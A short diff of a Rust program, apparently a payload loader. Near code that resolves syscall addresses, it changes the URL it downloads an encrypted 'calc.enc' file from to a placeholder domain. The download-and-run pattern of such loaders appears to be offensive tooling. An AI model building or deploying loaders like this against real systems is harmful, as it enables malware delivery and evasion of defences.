@@ -244,7 +244,7 @@ fn main() {
         get_syscall_addresses();
 
         // Fetch Data from URL
-        let file_download_url = to_wide_string("http://127.0.0.1:8000/Desktop/Proj/calc/calc.enc"); // Change URL to the actual data location
+        let file_download_url = to_wide_string("http://yourdomain.com"); // Change URL to the actual data location
         let data = match fetch_file_from_urlw(file_download_url.as_ptr()) {
             Ok(data) => {
                 println!("[+] Data retrieved successfully. Size: {} bytes", data.len());
